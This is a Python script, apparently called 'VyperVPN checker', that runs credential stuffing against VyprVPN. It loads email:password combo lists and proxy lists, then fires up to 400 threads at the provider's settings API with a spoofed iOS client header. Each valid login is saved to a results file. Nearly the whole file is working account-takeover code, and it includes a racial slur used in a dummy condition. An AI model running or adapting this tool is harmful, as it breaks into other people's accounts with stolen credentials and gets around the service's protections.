import requests
import random
import threading
import os
import time
import sys
import json
from re import search
from time import gmtime, strftime
time1 = strftime("%Y-%m-%d-%H-%M-%S", gmtime())



global emails
global passwords
emails = []
passwords = []
combolist = []
proxylist=[]
error=0
bad=0
good=0
cpm=0
cpm1=0
checked=0
banned=0
premium=0
free=0
num=0
clear = lambda: os.system('cls')
os.system("title VyperVPN by ExtremeDev")
open("proxies.txt", "a")
open("combos.txt", "a")

if not os.path.exists(f"results/vyper/{time1}/"):
    os.makedirs(f"results/vyper/{time1}/")
mesaje = ["yeah nobody else does it better", "i had to type it: IM SHY", "tedo da pedo", "Wrixty the 60", "legend was here", "0x72 gonna crack this tool"]
logo = """
██╗   ██╗██╗   ██╗██████╗ ███████╗██████╗ ██╗   ██╗██████╗ ███╗   ██╗
██║   ██║╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██║   ██║██╔══██╗████╗  ██║
██║   ██║ ╚████╔╝ ██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝██╔██╗ ██║
╚██╗ ██╔╝  ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔═══╝ ██║╚██╗██║
 ╚████╔╝    ██║   ██║     ███████╗██║  ██║ ╚████╔╝ ██║     ██║ ╚████║
  ╚═══╝     ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝     ╚═╝  ╚═══╝
                                                                      """


def load_accounts():
    with open('combos.txt','r', encoding='utf8') as f:
        for x in f.readlines():
            emails.append(x.split(":")[0].replace('\n',''))
            passwords.append(x.split(":")[1].replace("\n",''))

with open("proxies.txt", 'r', encoding="utf-8", errors='ignore') as n:
    proxypath = n.readlines()
    for linie_proxy in proxypath:
        linie_prox = linie_proxy.split()[0]
        proxylist.append(linie_prox)
    
def ecran():
    global cpm,cpm1,error,good,bad,checked,premium,free
    cpm1=cpm
    cpm=0
    clear()
    print()
    print(logo)
    print()
    print("Coded by ExtremeDev - " + random.choice(mesaje))
    print()
    print(f"Checked: {checked}/{len(emails)}")
    print(f"Good: {good}")
    print(f"Bad: {bad}")
    print(f"Errors: {error}")
    print(f"CPM: {cpm1*60}")

    time.sleep(1)
    threading.Thread(target=ecran, args=(),).start()


def menu():
    clear()
    print()
    print(logo)
    print()
    print("Coded by ExtremeDev - " + random.choice(mesaje))
    print()
    print("Hello, welcome to VyperVPN..")
    print("Where do you want to go?")
    print()
    print("[1] VyperVPN checker")
    print("[2] Credits")
    print("[3] Quit")
    alegere_menu = input("->")
    if alegere_menu == "1":
        print()
    elif alegere_menu == "2":
        clear()
        print()
        print(logo)
        print()        
        print("Owner: ExtremeDev#6969")
        print()
        print("Author: ExtremeDev#6969")
        print()
        input("Press ENTER to go on menu")
        menu()
    elif alegere_menu == "3":
        print("We are closing..")
        time.sleep(3)
        sys.exit()
    else:
        print("Invalid input..")
        time.sleep(2)
        menu()
def checker(email, password, proxylist):
    global error, good, bad, cpm, checked, banned, premium, free
    try:
        with requests.Session() as sess:
            proxyz = random.choice(proxylist)
            proxies = {'https': f'https://{proxyz}', 'http': f'http://{proxyz}'}
            sess.proxies= proxies
            url = "https://api.goldenfrog.com/settings" 
            headers = {
                "Host": "api.goldenfrog.com",
                "X-GF-PLATFORM-VERSION": "12.0.1",
                "X-API-Features": "partial_sign_up;",
                "X-GF-PRODUCT": "VyprVPN",
                "Accept": "*/*",
                "X-GF-PLATFORM": "iOS",
                "locale": "de_DE",
                "X-GF-DEVICE-NAME": "iPhone",
                "password": f"{password}",
                "X-API-Version": "2",
                "username": f"{email}",
                "User-Agent": "VyprVPN/7327 CFNetwork/974.2.1 Darwin/18.0.0",
                "Connection": "keep-alive",
                "X-GF-PRODUCT-VERSION": "3.0.0.7327",
                "X-GF-Agent": "VyprVPN iOS 3.0.0.7327 (21a2ef40)" 
            }
            r = sess.get(url, headers=headers)
            if "confirmed\": true" in r.text:
                good+=1
                checked+=1
                cpm+=1
                open(f"results/vyper/{time1}/good.txt", "a").write(f"{email}:{password} \n")
            elif "invalid username or password" in r.text:
                bad+=1
                checked+=1
                cpm+=1
                open(f"results/vyper/{time1}/bad.txt", "a").write(f"{email}:{password} \n")
    except Exception:
        error+=1
        pass

load_accounts()
menu()

if "nibba" == "nibba":
    ecran()
    num = 0
    while 1:
        if threading.active_count() < 400:
            if len(emails) > num:
                threading.Thread(target=checker, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1
